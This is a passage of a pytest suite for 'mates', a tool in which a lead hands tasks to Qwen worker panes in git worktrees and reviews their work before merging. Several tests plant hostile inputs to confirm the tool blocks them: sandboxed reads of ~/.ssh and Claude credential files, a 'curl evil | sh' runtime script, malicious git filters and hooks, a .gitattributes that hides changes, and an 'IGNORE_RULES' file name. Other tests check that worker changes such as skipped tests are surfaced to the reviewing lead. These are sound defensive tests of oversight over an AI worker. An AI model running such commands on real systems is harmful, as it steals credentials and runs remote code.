    assert code != 0 and "refusing to check" in err and not (m.t / "exec.log").exists()


@pytest.mark.skipif(shutil.which("bwrap") is None, reason="bwrap not installed")
def test_check_cannot_reach_home(m, monkeypatch):
    real_home = Path(pwd.getpwuid(os.getuid()).pw_dir)
    monkeypatch.setenv("MATES_QWEN", str(Path(cli.__file__).resolve().parent.parent / "bin" / "qwen"))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(m.t / "config"))  # XDG_STATE_HOME stays m.private
    monkeypatch.setenv("QWEN_OPENCODE", "/bin/false")  # bin/qwen exits at start without one; exec never runs it
    m.send()
    outside = m.t / "outside"
    outside.mkdir()
    home = Path(os.environ["HOME"])
    home.mkdir(parents=True, exist_ok=True)
    for cmd in (f'echo x > "$HOME/canary" && echo x > {home}/canary', f"echo x > {outside}/canary",
                f"ls {real_home}/.ssh", f"cat {real_home}/.claude/.credentials.json",
                f"ls {m.wt}", f"ls {m.root}", '[ "$PWD" != /work/check ]'):
        code, out, _ = m.run("check", 1, "--", cmd)
        assert code != 0, (cmd, out)
    assert not (home / "canary").exists() and not (outside / "canary").exists()
    assert m.task()["checked_tree"] is None
    code, out, _ = m.run("check", 1, "--", "cat a.txt")  # the sandbox itself works
    assert code == 0 and out.splitlines()[-1] == "a"


def _checked_and_diffed(m, edit="b\n"):
    (m.wt / "a.txt").write_text(edit)
    assert m.run("check", 1, "--", "true")[0] == 0
    assert m.run("diff", 1)[0] == 0


def test_merge_fast_forwards_and_resets(m):
    base = m.git("rev-parse", "HEAD")
    m.send("make a.txt say b")
    (m.wt / "untracked_new.py").write_text("z = 3\n")
    _checked_and_diffed(m)
    code, out, err = m.run("merge", 1)
    assert code == 0, err
    head = m.git("rev-parse", "HEAD")
    assert m.git("rev-parse", "HEAD^") == base
    assert m.git("log", "-1", "--format=%s") == "mates qwen-1: make a.txt say b"
    assert (m.root / "a.txt").read_text() == "b\n" and (m.root / "untracked_new.py").exists()
    assert m.git("status", "--porcelain") == ""
    assert m.git("rev-parse", "refs/heads/mates/qwen-1") == head == m.git("rev-parse", "HEAD", cwd=m.wt)
    assert cli.worktree_dirty(str(m.root), 1) == []
    assert m.git("status", "--porcelain", cwd=m.wt) == ""  # the worktree's own index matches too
    assert m.task() is None


def test_merge_refuses_without_check(m):
    m.send()
    (m.wt / "a.txt").write_text("b\n")
    assert m.run("diff", 1)[0] == 0
    code, _, err = m.run("merge", 1)
    assert code != 0 and "mates check 1" in err


def test_merge_refuses_without_diff(m):
    m.send()
    (m.wt / "a.txt").write_text("b\n")
    assert m.run("check", 1, "--", "true")[0] == 0
    code, _, err = m.run("merge", 1)
    assert code != 0 and "mates diff 1" in err
    assert (m.root / "a.txt").read_text() == "a\n"


def test_merge_logs_accepted(m):
    m.send()
    _checked_and_diffed(m)
    tree = m.task()["checked_tree"]
    assert m.run("merge", 1)[0] == 0
    (rec,) = m.log()
    assert (rec["outcome"], rec["route"], rec["pane"], rec["attempts"], rec["summary"]) == \
        ("accepted", "qwen", 1, 1, "fix a.txt")
    assert rec["tree"] == tree and rec["full_diff_read"] is True and rec["check"] == "true"
    assert rec["check_sha"] == hashlib.sha256(b"true").hexdigest()
    assert rec["reason"] == "clear check" and rec["questions"] == [] and rec["flags"] == []


def test_merge_commits_checked_snapshot(m):
    m.send()
    _checked_and_diffed(m)
    checked = m.task()["checked_tree"]
    (m.wt / "a.txt").write_text("edited after the check\n")
    code, _, err = m.run("merge", 1)
    assert code == 0
    assert m.git("rev-parse", "HEAD^{tree}") == checked
    assert (m.root / "a.txt").read_text() == "b\n"
    refs = m.git("for-each-ref", "--format=%(refname)", "refs/mates/discarded/").splitlines()
    assert len(refs) == 1 and refs[0].startswith("refs/mates/discarded/1-") and refs[0] in err
    assert m.git("show", f"{refs[0]}:a.txt") == "edited after the check"
    assert (m.wt / "a.txt").read_text() == "b\n"


def test_merge_refuses_when_lead_moved(m):
    m.send()
    _checked_and_diffed(m)
    m.lead_commit("b.txt", "lead\n")
    code, _, err = m.run("merge", 1)
    assert code != 0 and "lead moved: run mates sync 1, then check again" in err


def test_sync_carries_work_and_clears_check(m):
    m.send()
    (m.wt / "new.py").write_text("n = 1\n")
    _checked_and_diffed(m)
    lead = m.lead_commit("b.txt", "lead\n")
    code, out, err = m.run("sync", 1)
    assert code == 0, err
    t = m.task()
    assert t["base"] == lead and t["checked_tree"] is None and t["diffed_tree"] is None
    assert m.git("rev-parse", "HEAD", cwd=m.wt) == lead
    assert (m.wt / "b.txt").read_text() == "lead\n" and (m.wt / "a.txt").read_text() == "b\n"
    assert (m.wt / "new.py").exists()
    assert sorted(cli.worktree_dirty(str(m.root), 1)) == ["a.txt", "new.py"]
    assert m.run("merge", 1)[0] != 0  # the check must run again
    _checked_and_diffed(m)
    assert m.run("merge", 1)[0] == 0
    assert m.git("rev-parse", "HEAD^") == lead and (m.root / "new.py").exists()


def test_sync_conflict_changes_nothing(m):
    m.send()
    _checked_and_diffed(m, "qwen's line\n")
    before = m.task()
    lead = m.lead_commit("a.txt", "lead's line\n")
    code, out, _ = m.run("sync", 1)
    assert code == 1 and out.splitlines() == ["conflict", "a.txt"]
    assert m.task() == before
    assert (m.wt / "a.txt").read_text() == "qwen's line\n"
    assert m.git("rev-parse", "HEAD", cwd=m.wt) != lead


def test_merge_refuses_dirty_lead_paths(m):
    m.send()
    _checked_and_diffed(m)
    (m.root / "a.txt").write_text("the lead's own uncommitted edit\n")
    code, _, err = m.run("merge", 1)
    assert code != 0 and "uncommitted" in err and "a.txt" in err
    assert (m.root / "a.txt").read_text() == "the lead's own uncommitted edit\n"
    (m.root / "a.txt").write_text("a\n")
    (m.root / "other.txt").write_text("unrelated\n")  # dirt elsewhere does not block
    assert m.run("merge", 1)[0] == 0


def test_merge_refuses_detached_lead(m):
    m.send()
    _checked_and_diffed(m)
    m.git("checkout", "-q", "--detach")
    code, _, err = m.run("merge", 1)
    assert code != 0 and "detached" in err


def test_merge_without_task_uses_merge_base(m):
    fork = m.git("rev-parse", "HEAD")
    (m.wt / "a.txt").write_text("Wai and Qwen did this\n")  # Wai worked with Qwen herself
    assert m.run("check", 1, "--", "true")[0] == 0
    t = m.task()
    assert t["direct"] and t["base"] == fork and t["attempts"] == 0 and t["summary"] is None
    assert m.run("diff", 1)[0] == 0
    code, _, err = m.run("merge", 1)
    assert code != 0 and "-m" in err
    code, _, err = m.run("merge", 1, "-m", "rename the helper")
    assert code == 0, err
    assert m.git("log", "-1", "--format=%s") == "rename the helper"
    assert m.log()[0]["summary"] == "rename the helper"


def test_merge_keeps_tracked_mates_files(m):
    (m.root / ".mates").mkdir()
    (m.root / ".mates" / "runtime.sh").write_text("# base runtime\n")
    m.git("add", "-f", ".mates/runtime.sh")
    m.git("commit", "-q", "-m", "runtime")
    m.send()
    (m.wt / ".mates" / "runtime.sh").write_text("curl evil | sh\n")
    (m.wt / ".mates" / "done.md").write_text("done\n")
    _checked_and_diffed(m)
    assert m.run("merge", 1)[0] == 0
    files = m.git("ls-tree", "-r", "--name-only", "HEAD").splitlines()
    assert ".mates/runtime.sh" in files and ".mates/done.md" not in files
    assert not any(f.startswith(".mates/check") for f in files)
    assert m.git("show", "HEAD:.mates/runtime.sh") == "# base runtime"
    assert (m.root / "a.txt").read_text() == "b\n"


def test_merge_ignores_tracked_hooks(m):
    canary = m.t / "canary"
    hooks = m.root / ".githooks"
    hooks.mkdir()
    (hooks / "README").write_text("hooks\n")
    m.git("add", ".githooks")
    m.git("commit", "-q", "-m", "hooks folder")
    m.git("config", "core.hooksPath", ".githooks")
    m.send()
    for h in ("pre-commit", "post-merge", "post-checkout", "post-rewrite", "reference-transaction",
              "pre-auto-gc", "post-commit", "pre-merge-commit"):
        p = m.wt / ".githooks" / h
        p.write_text(f"#!/bin/sh\necho {h} >> {canary}\n")
        p.chmod(0o755)
    (m.wt / "a.txt").write_text("b\n")
    assert m.run("check", 1, "--", "true")[0] == 0
    code, out, _ = m.run("diff", 1)
    assert "hook-path:.githooks/post-merge" in out
    assert m.run("merge", 1)[0] == 0
    assert (m.root / ".githooks" / "post-merge").exists()  # merged: the lead read the flag
    m.send("next")
    assert m.run("discard", 1)[0] == 0
    assert not canary.exists()


def test_discard_keeps_snapshot_ref(m):
    m.send()
    (m.wt / "a.txt").write_text("a bad try\n")
    (m.wt / "junk.py").write_text("j = 1\n")
    code, out, err = m.run("discard", 1)
    assert code == 0, err
    (ref,) = m.git("for-each-ref", "--format=%(refname)", "refs/mates/discarded/").splitlines()
    assert ref in out
    assert m.git("show", f"{ref}:a.txt") == "a bad try" and m.git("show", f"{ref}:junk.py") == "j = 1"
    assert (m.wt / "a.txt").read_text() == "a\n" and not (m.wt / "junk.py").exists()
    assert cli.worktree_dirty(str(m.root), 1) == []
    assert m.task() is None
    assert [r["outcome"] for r in m.log()] == ["escalated"]


def test_discard_failed_logs_failed(m):
    m.send()
    assert m.run("discard", 1, "--failed")[0] == 0
    assert [r["outcome"] for r in m.log()] == ["failed"]
    assert m.git("for-each-ref", "refs/mates/discarded/") == ""  # nothing to keep


def test_diff_ignores_qwen_attributes(m):
    """A Qwen `.gitattributes` cannot hide a change from the lead or from the guard flags."""
    m.send()
    (m.wt / ".gitattributes").write_text("*.txt -diff\n")
    (m.wt / "tests").mkdir()
    (m.wt / "tests" / ".gitattributes").write_text("*.py binary\n")
    (m.wt / "tests" / "test_a.py").write_text("import pytest\n@pytest.mark.skip\ndef test_x(): pass\n")
    (m.wt / "a.txt").write_text("PAYLOAD\n")
    (m.wt / "café.bin").write_bytes(b"\x00\x01binary")  # a name git quotes, binary content
    assert m.run("check", 1, "--", "true")[0] == 0
    code, out, _ = m.run("diff", 1)
    assert code == 0
    assert "+PAYLOAD" in out and "+@pytest.mark.skip" in out
    assert "Binary files" not in out  # --text: even the binary file shows its bytes
    flags = m.task()["flags"]
    assert "test-skipped:tests/test_a.py" in flags and "hook-path:.gitattributes" in flags
    assert "unnamed-file:café.bin" in flags


def test_no_filter_runs_from_qwen_attributes(m):
    """A lead-config filter, assigned by a Qwen `.gitattributes`, never runs as Wai:
    not in snapshot, check, diff, sync, merge or discard."""
    canary = m.t / "filter-canary"
    for var in ("clean", "smudge"):
        m.git("config", f"filter.evil.{var}", f"echo {var} >> {canary}; cat")
    m.git("config", "filter.evil.process", f"sh -c 'echo process >> {canary}'")
    m.git("config", "filter.lfs.clean", f"echo lfs >> {canary}; cat")
    m.send()
    (m.wt / ".gitattributes").write_text("* filter=evil\n*.bin filter=lfs\n")
    (m.wt / "a.txt").write_text("b\n")
    (m.wt / "x.bin").write_text("pointer?\n")
    # the attack is real: plain git in the worktree runs the filter
    probe = m.t / "probe-index"
    subprocess.run(["git", "add", "-A"], cwd=m.wt, capture_output=True,
                   env={"PATH": "/usr/bin:/bin", "HOME": str(m.t), "GIT_INDEX_FILE": str(probe)})
    assert canary.exists()
    canary.unlink()
    assert cli.worktree_dirty(str(m.root), 1)
    assert m.run("check", 1, "--", "true")[0] == 0
    assert m.run("diff", 1)[0] == 0
    m.lead_commit("b.txt", "lead\n")
    assert m.run("sync", 1)[0] == 0
    _checked_and_diffed(m)
    assert m.run("merge", 1)[0] == 0, "merge"
    assert not canary.exists()
    m.send("next")
    (m.wt / "a.txt").write_text("again\n")
    assert m.run("check", 1, "--", "true")[0] == 0
    assert m.run("discard", 1)[0] == 0
    assert not canary.exists()


# --- panes, housekeeping and the log ---------------------------------------------------------

def _lead_window(m, split_id, widths):
    """The lead pane %0 is open; the next split makes `split_id`; `widths` are list-panes rows."""
    m.pane("%0", "lead")
    (m.t / "split-id").write_text(split_id + "\n")
    (m.t / "widths").write_text("".join(f"{w}\n" for w in widths))


def test_add_then_restore_has_two(m):
    _lead_window(m, "%2", ["%0 0 100 200", "%1 101 99 200"])
    code, out, err = m.run("add")
    assert code == 0, err
    calls = m.tmux_calls()
    split = next(c for c in calls if c.startswith("split-window"))
    assert split.startswith(f"split-window -h -P -F #{{pane_id}} -t %1 -c {m.root} ")  # right of the rightmost
    assert f"QWEN_ROOT={_wt(str(m.root), 2)}" in split
    assert f"set-option -p -t %2 @mates {m.key}:2" in calls
    assert calls.index(f"set-option -p -t %2 @mates {m.key}:2") < calls.index("wait-for -S mates-go-%2")
    assert (m.root / ".claude/worktrees/mates-qwen-2").is_dir() and "pane 2" in out
    st = m.state()
    assert [(q["n"], q["closed"]) for q in st["qwens"]] == [(1, False), (2, False)]
    plan = cli.launch_plan(st, str(m.root), False, [])
    assert [q["n"] for q in plan["qwens"]] == [1, 2]


def test_add_reuses_closed(m):
    st = m.state()
    st["qwens"] += [_q(str(m.root), 3, closed=True), _q(str(m.root), 2, closed=True)]
    session.save(str(m.root), st)
    _lead_window(m, "%5", ["%0 0 100 200", "%1 101 99 200"])
    assert m.run("add")[0] == 0
    by_n = {q["n"]: q["closed"] for q in m.state()["qwens"]}
    assert by_n == {1: False, 2: False, 3: True}
    assert (m.root / ".claude/worktrees/mates-qwen-2").is_dir()
    assert not (m.root / ".claude/worktrees/mates-qwen-3").exists()
    # a pane that is gone counts as closed: its entry is the one reused
    m.no_panes()
    _lead_window(m, "%6", ["%0 0 100 200"])
    assert m.run("add")[0] == 0
    calls = m.tmux_calls()
    assert [c for c in calls if c.startswith("split-window")][-1].startswith(
        "split-window -h -P -F #{pane_id} -t %0 -l 50% ")
    assert f"set-option -p -t %6 @mates {m.key}:1" in calls
    assert {q["n"]: q["closed"] for q in m.state()["qwens"]} == {1: False, 2: True, 3: True}


def test_add_no_room_message(m):
    _lead_window(m, "%2", ["%0 0 100 200", "%1 101 99 200"])
    (m.t / "noroom").write_text("")
    before = m.state()
    code, out, err = m.run("add")
    assert code != 0
    assert err.strip() == "mates: no room for another Qwen pane: widen the window or close a pane"
    assert m.state() == before
    assert not (m.root / ".claude/worktrees/mates-qwen-2").exists()
    assert "mates/qwen-2" not in m.git("branch", "--list")
    assert not [c for c in m.tmux_calls() if c.startswith(("set-option", "wait-for"))]


def test_remove_refuses_dirty(m):
    (m.wt / "a.txt").write_text("qwen's unmerged work\n")
    code, _, err = m.run("remove", 1)
    assert code != 0 and "a.txt" in err and "--force" in err and "mates add" in err
    assert (m.wt / "a.txt").read_text() == "qwen's unmerged work\n"
    assert [(q["n"], q["closed"]) for q in m.state()["qwens"]] == [(1, True)]  # closed, kept: add reopens it
    assert m.git("branch", "--list", "mates/qwen-1") != ""


def _qwen_writes_while_alive(m):
    """Qwen stand-in: while pane %1 is open, any tmux call lets it write late.py."""
    hook = m.t / "on-any"
    hook.write_text(f"""#!/bin/sh
grep -q '^%1	' '{m.t}/panes' 2>/dev/null && echo 'late = 1' > '{m.wt}/late.py'
exit 0
""")
    hook.chmod(0o755)


def test_remove_never_deletes_late_writes(m):
    _qwen_writes_while_alive(m)
    code, _, err = m.run("remove", 1)  # clean when asked, but Qwen writes until its pane is gone
    assert code != 0 and "late.py" in err
    assert (m.wt / "late.py").read_text() == "late = 1\n"
    (m.t / "on-any").unlink()
    m.pane("%1", 1)
    _qwen_writes_while_alive(m)
    (m.wt / "late.py").unlink()
    code, out, err = m.run("remove", 1, "--force")
    assert code == 0, err
    (ref,) = m.git("for-each-ref", "--format=%(refname)", "refs/mates/discarded/").splitlines()
    assert m.git("show", f"{ref}:late.py") == "late = 1" and not m.wt.exists()


def test_remove_refuses_open_task(m):
    m.send()
    code, _, err = m.run("remove", 1)
    assert code != 0 and "open task" in err and m.task() is not None


def test_remove_force_snapshots(m):
    m.send()
    (m.wt / "a.txt").write_text("a bad try\n")
    (m.wt / "junk.py").write_text("j = 1\n")
    code, out, err = m.run("remove", 1, "--force")
    assert code == 0, err
    (ref,) = m.git("for-each-ref", "--format=%(refname)", "refs/mates/discarded/").splitlines()
    assert ref in out
    assert m.git("show", f"{ref}:a.txt") == "a bad try" and m.git("show", f"{ref}:junk.py") == "j = 1"
    assert not m.wt.exists()
    assert "mates-qwen-1" not in m.git("worktree", "list")
    assert m.git("branch", "--list", "mates/qwen-1") == ""
    assert "kill-pane -t %1" in m.tmux_calls()
    assert m.state()["qwens"] == []
    assert [r["outcome"] for r in m.log()] == ["failed"]


def test_remove_is_only_drop(m):
    st = m.state()
    st["qwens"] = []
    session.save(str(m.root), st)  # a save without the entry keeps it
    assert [q["n"] for q in m.state()["qwens"]] == [1]
    m.no_panes()
    m.lead_pane()
    assert m.run("wait", 1, "--timeout", "1")[1] == "dead\n"  # a gone pane is marked closed, never dropped
    assert [(q["n"], q["closed"]) for q in m.state()["qwens"]] == [(1, True)]
    code, out, err = m.run("remove", 1)
    assert code == 0, err
    assert m.state()["qwens"] == [] and not m.wt.exists()
    assert m.git("branch", "--list", "mates/qwen-1") == ""
    # a leftover folder git does not know: refused as unreadable, removed with --force
    left = m.root / ".claude/worktrees/mates-qwen-2"
    (left / "sub").mkdir(parents=True)
    (left / "sub" / "f").write_text("x\n")
    st = m.state()
    st["qwens"].append(_q(str(m.root), 2, closed=True))
    session.save(str(m.root), st)
    code, _, err = m.run("remove", 2)
    assert code != 0 and "--force" in err and left.exists()
    assert m.run("remove", 2, "--force")[0] == 0
    assert not left.exists() and m.state()["qwens"] == []


def test_list_shows_failed_pane(m):
    m.send()
    (m.wt / "a.txt").write_text("b\n")
    m.no_panes()
    m.pane("%1", 1, failed=True)
    st = m.state()
    st["qwens"].append(_q(str(m.root), 2, closed=True))
    session.save(str(m.root), st)
    code, out, err = m.run("list")
    assert code == 0, err
    header, row1, row2 = out.splitlines()
    assert header.split()[:4] == ["n", "pane", "branch", "dirty"]
    t = m.task()
    assert row1.split()[:5] == ["1", "%1", "failed", "mates/qwen-1", "yes"] and t["id"] in row1
    assert row1.split()[-1] == "no"
    assert row2.split()[:4] == ["2", "-", "mates/qwen-2", "no"] and row2.endswith("yes")
    assert m.state()["qwens"][0]["closed"] is False  # failed is not gone


def test_list_after_window_gone_keeps_restore(m):
    """Final review I3: after a reboot (no tmux panes at all, no lead), `mates list` is
    read-only, and the next restore still brings back every open entry."""
    st = m.state()
    st["qwens"].append(_q(str(m.root), 2))
    session.save(str(m.root), st)
    m.no_panes()
    before = (session.STATE_DIR / f"{m.key}.json").read_bytes()
    code, out, err = m.run("list")
    assert code == 0, err
    assert (session.STATE_DIR / f"{m.key}.json").read_bytes() == before  # list saves nothing
    plan = cli.launch_plan(m.state(), str(m.root), False, [])
    assert [q["n"] for q in plan["qwens"]] == [1, 2]


def test_gone_pane_closed_only_while_lead_lives(m):
    m.send()
    m.no_panes()  # the whole window is gone: not Wai closing one pane
    assert m.run("wait", 1, "--timeout", "1")[1] == "dead\n"
    assert m.state()["qwens"][0]["closed"] is False
    code, _, err = m.run("send", 1, "--reason", "r", "task")
    assert code != 0 and "gone" in err and m.state()["qwens"][0]["closed"] is False
    m.lead_pane()  # the lead is up and pane 1 is not: Wai closed it
    assert m.run("wait", 1, "--timeout", "1")[1] == "dead\n"
    assert m.state()["qwens"][0]["closed"] is True


def test_log_filters(m):
    import logrec
    root = str(m.root.resolve())
    for repo, route, outcome, summary in ((root, "qwen", "accepted", "alpha"), (root, "claude-self", "accepted", "beta"),
                                          ("/x/other", "qwen", "escalated", "gamma"), (root, "qwen", "sent-back", "delta")):
        logrec.append(cli.LOG, {"repo": repo, "task_id": summary[:2], "summary": summary, "route": route,
                                "reason": "r", "outcome": outcome})

    def shown(*args):
        code, out, err = m.run("log", *args)
        assert code == 0, err
        return [line.split()[-1] for line in out.splitlines()[1:]]

    assert shown() == ["alpha", "beta", "gamma", "delta"]
    assert shown("--route", "qwen") == ["alpha", "gamma", "delta"]
    assert shown("--route", "qwen", "--outcome", "accepted") == ["alpha"]
    assert shown("--repo") == ["alpha", "beta", "delta"]
    assert shown("--repo", "/x/other") == ["gamma"]
    assert m.run("log", "--route", "gpt")[0] != 0


def test_log_route_appends(m):
    code, out, err = m.run("log-route", "claude-self", "rename the helper", "divergent outcomes")
    assert code == 0, err
    code, _, err = m.run("log-route", "claude-subagent", "survey", "wide read", "--outcome", "escalated")
    assert code == 0, err
    a, b = m.log()
    assert (a["route"], a["summary"], a["reason"], a["outcome"], a["repo"]) == \
        ("claude-self", "rename the helper", "divergent outcomes", "accepted", str(m.root.resolve()))
    assert (b["route"], b["outcome"]) == ("claude-subagent", "escalated")
    assert len(a["task_id"]) == 12 and a["task_id"] != b["task_id"] and a["task_id"] in out
    assert m.run("log-route", "qwen", "s", "r")[0] != 0  # qwen lines come from the pane commands
    assert len(m.log()) == 2


def _iso(ts):
    return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(ts)) + f".{int(ts * 1000) % 1000:03d}Z"


def _asst(ts, mid, cmd=None, usage=None, tool="Bash"):
    content = [{"type": "tool_use", "id": "tu", "name": tool, "input": {"command": cmd}}] if cmd else \
        [{"type": "text", "text": "thinking about it"}]
    return {"type": "assistant", "timestamp": _iso(ts), "uuid": uuid.uuid4().hex,
            "message": {"id": mid, "role": "assistant", "content": content, "usage": usage or {}}}


def _usage(i, cc, o, cr):
    return {"input_tokens": i, "cache_creation_input_tokens": cc, "output_tokens": o, "cache_read_input_tokens": cr}


def test_lead_tokens_counts_only_this_pane(tmp_path):
    now = time.time()
    lines = [
        _asst(now - 100, "old", "mates send 1 --reason r 'x'", _usage(1000, 0, 0, 0)),  # before since
        _asst(now, "m1", None, _usage(10, 100, 2, 1000)),  # one API message in two entries:
        _asst(now, "m1", "mates send 1 --reason 'clear' \"fix a.txt\"", _usage(10, 100, 5, 1000)),  # counted once
        _asst(now + 1, "m2", "mates diff 2", _usage(999, 0, 0, 0)),  # another pane
        _asst(now + 2, "m3", "mates check 12 -- true", _usage(999, 0, 0, 0)),  # pane 12, not 1
        _asst(now + 3, "m4", "ls -la", _usage(999, 0, 0, 0)),
        _asst(now + 4, "m5", "xmates send 1 y", _usage(999, 0, 0, 0)),
        _asst(now + 5, "m6", "until bin/mates wait 1; do :; done", _usage(1, 2, 3, 40), tool="Monitor"),
        _asst(now + 6, "m7", "cd /r && mates check 1 -- pytest -q", _usage(4, 0, 6, 0)),
        {"type": "user", "timestamp": _iso(now + 7), "message": {"content": "mates send 1 z"}},
    ]
    p = tmp_path / "t.jsonl"
    p.write_text("".join(json.dumps(x) + "\n" for x in lines) + "not json\n")
    assert session.lead_tokens(p, 1, now - 50) == (10 + 100 + 5 + 1 + 2 + 3 + 4 + 6, 1000 + 40)
    assert session.lead_tokens(p, 2, now - 50) == (999, 0)
    assert session.lead_tokens(tmp_path / "missing.jsonl", 1, 0) == (0, 0)


def test_log_line_has_cost_fields(m):
    import http.server
    import threading

    class PS(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            body = json.dumps({"models": [{"name": "qwen-x:latest", "model": "qwen-x:latest"}]}).encode()
            self.send_response(200 if self.path == "/api/ps" else 404)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):
            pass

    srv = http.server.HTTPServer(("127.0.0.1", 0), PS)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        (m.t / "host").write_text(f"127.0.0.1:{srv.server_address[1]}\n")
        now = time.time()
        d = session.PROJECTS_DIR / m.key
        d.mkdir(parents=True)
        (d / "lead-sid.jsonl").write_text("".join(json.dumps(x) + "\n" for x in [
            {"type": "custom-title", "customTitle": "mates repo"},
            _asst(now - 5, "m1", "mates send 1 --reason r 'fix a.txt'", _usage(10, 100, 5, 1000)),
            _asst(now - 4, "m2", "mates diff 2", _usage(999, 0, 0, 0)),
            _asst(now - 3, "m3", "mates check 1 -- true", _usage(1, 2, 3, 40))]))
        m.on_enter_creates_session("ses_1")
        m.send()
        t0 = m.task()["attempt_ts"]
        m.msg("ses_1", "assistant", t0 - 50, completed_s=t0 - 49, finish="stop", tokens=(1000, 1000))  # earlier
        m.msg("ses_1", "user", t0 + 0.5)
        m.msg("ses_1", "assistant", t0 + 1, completed_s=t0 + 3, finish="tool-calls", tokens=(100, 20))
        m.msg("ses_1", "assistant", t0 + 4, completed_s=t0 + 6, finish="stop", tokens=(50, 5))
        _checked_and_diffed(m)
        assert m.run("merge", 1)[0] == 0
        (rec,) = m.log()
        assert rec["worker_tokens"] == 175
        assert rec["worker_wall_s"] == pytest.approx(6.0, abs=0.11)
        assert rec["answered_by"] == ["qwen-x:latest"]
        assert (rec["lead_tokens"], rec["lead_cache_read"]) == (115 + 6, 1040)
        assert (rec["pane"], rec["questions"], rec["tree"], rec["full_diff_read"]) == (1, [], rec["tree"], True)
        assert m.state()["qwens"][0]["lead_since"] >= now
        # no server: answered_by is null; the lead's earlier commands were counted already
        (m.t / "host").unlink()
        m.on_enter_creates_session("ses_2")  # the next task's session: ses_1's tokens are not counted again
        m.send("next")
        assert m.run("discard", 1)[0] == 0
        rec2 = m.log()[-1]
        assert rec2["answered_by"] is None and (rec2["lead_tokens"], rec2["lead_cache_read"]) == (0, 0)
        assert rec2["worker_tokens"] == 0 and rec2["outcome"] == "escalated"
    finally:
        srv.shutdown()
        srv.server_close()


# --- retro -----------------------------------------------------------------------------

class Retro:
    """`mates retro` with a stub claude (MATES_CLAUDE), a temp log and a temp mates source checkout."""

    def __init__(self, tmp_path, monkeypatch, capsys):
        import retro
        self.t, self.capsys, self.retro = tmp_path, capsys, retro
        monkeypatch.setattr(cli, "LOG", tmp_path / "mates" / "log.jsonl")
        import fsutil
        self.run_dir = tmp_path / "run"  # stands in for the user runtime folder (tmp_path is under /tmp)
        self.run_dir.mkdir(mode=0o700)
        monkeypatch.setattr(fsutil, "_private_base", lambda: str(self.run_dir))
        self.src = tmp_path / "src"
        (self.src / "mates").mkdir(parents=True)
        self.lessons = self.src / "mates" / "lead-lessons.md"
        self.lessons.write_text("## Lessons\n\nNone yet. The daily retro rewrites this section.\n")
        self.git("init", "-q", "-b", "main")
        self.git("add", "-A")
        self.git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "init")
        monkeypatch.setattr(retro, "SRC", self.src)
        monkeypatch.setenv("GIT_AUTHOR_NAME", "t")
        monkeypatch.setenv("GIT_AUTHOR_EMAIL", "t@t")
        monkeypatch.setenv("GIT_COMMITTER_NAME", "t")
        monkeypatch.setenv("GIT_COMMITTER_EMAIL", "t@t")
        stub = tmp_path / "claude-stub"
        stub.write_text("#!/usr/bin/env python3\n"
                        "import json, os, pathlib, sys\n"
                        f"t = pathlib.Path({str(tmp_path)!r})\n"
                        "n = len(list(t.glob('call-*.json')))\n"
                        "(t / f'call-{n}.json').write_text(json.dumps({'argv': sys.argv[1:], 'cwd': os.getcwd(),\n"
                        "    'mode': os.stat('.').st_mode & 0o777, 'listing': os.listdir('.'),\n"
                        "    'stdin': sys.stdin.read(), 'api_key': os.environ.get('ANTHROPIC_API_KEY')}))\n"
                        "print(json.dumps([{'type': 'result', 'result': (t / 'reply.json').read_text()}]))\n")
        stub.chmod(0o755)
        monkeypatch.setenv("MATES_CLAUDE", str(stub))
        self.reply()

    def git(self, *a):
        return subprocess.run(["git", "-C", str(self.src), *a], check=True, capture_output=True, text=True).stdout

    def reply(self, findings="All fine.", lessons=(), proposals=()):
        (self.t / "reply.json").write_text(json.dumps({"findings_md": findings, "lessons": list(lessons),
                                                       "proposals": list(proposals)}))

    def line(self, day, **kw):
        import logrec
        rec = {"repo": "/home/x/src/widget", "task_id": uuid.uuid4().hex[:12], "summary": "fix add()",
               "route": "qwen", "reason": "clear check", "outcome": "accepted", "ts": f"{day}T10:00:00Z"}
        rec.update(kw)
        cli.LOG.parent.mkdir(parents=True, exist_ok=True)
        logrec.append(cli.LOG, rec)

    def run(self, *args):
        try:
            code = cli.main(["retro", *map(str, args)])
        except SystemExit as e:
            code = e.code
        cap = self.capsys.readouterr()
        return code, cap.out, cap.err

    def calls(self):
        return [json.loads((self.t / f"call-{i}.json").read_text())
                for i in range(len(list(self.t.glob("call-*.json"))))]

    def retro_file(self, day):
        return cli.LOG.parent / "retros" / f"{day}.md"

    def kept(self):
        return [l[2:] for l in self.lessons.read_text().splitlines() if l.startswith("- ")]


@pytest.fixture
def rt(tmp_path, monkeypatch, capsys):
    return Retro(tmp_path, monkeypatch, capsys)


def test_retro_skips_empty_day(rt):
    rt.line("2026-11-08")
    code, out, err = rt.run("--date", "2026-11-09")
    assert code == 0, err
    assert rt.calls() == [] and not rt.retro_file("2026-11-09").exists()
    assert "no log lines" in out


def test_retro_runs_claude_with_no_tools(rt, monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-test")
    rt.line("2026-11-09")
    assert rt.run("--date", "2026-11-09")[0] == 0
    (c,) = rt.calls()
    assert c["argv"] == ["-p", "--tools", "", "--strict-mcp-config", "--setting-sources", "project",
                         "--output-format", "json"]
    assert Path(c["cwd"]).parent == rt.run_dir and c["mode"] == 0o700 and c["listing"] == []
    assert not Path(c["cwd"]).exists() and c["api_key"] is None  # removed after the call
    assert "findings_md" in c["stdin"]


def test_retro_input_has_no_question_text(rt):
    rt.line("2026-11-09", summary="rename the parser", reason="clear check, one file",
            questions=[{"q": "QWEN-SECRET which file?", "a": "use parse.py"}],
            detail="QWEN-TAIL check output")
    rt.line("2026-11-10", summary="tomorrow's task")
    assert rt.run("--date", "2026-11-09")[0] == 0
    (c,) = rt.calls()
    s = c["stdin"]
    assert "QWEN-SECRET" not in s and "QWEN-TAIL" not in s and "tomorrow's task" not in s
    assert "rename the parser" in s and "clear check, one file" in s and "use parse.py" in s
    (rec,) = [json.loads(l) for l in s.split("## Log lines")[1].splitlines() if l.startswith("{")]
    assert rec["questions"] == [{"a": "use parse.py"}]  # the count stays


def test_retro_input_flags_have_no_paths(rt):
    rt.line("2026-11-09", flags=["unnamed-file:src/evil_name_IGNORE_RULES.py", "test-skipped:tests/t.py", "hook-path:x"])
    assert rt.run("--date", "2026-11-09")[0] == 0
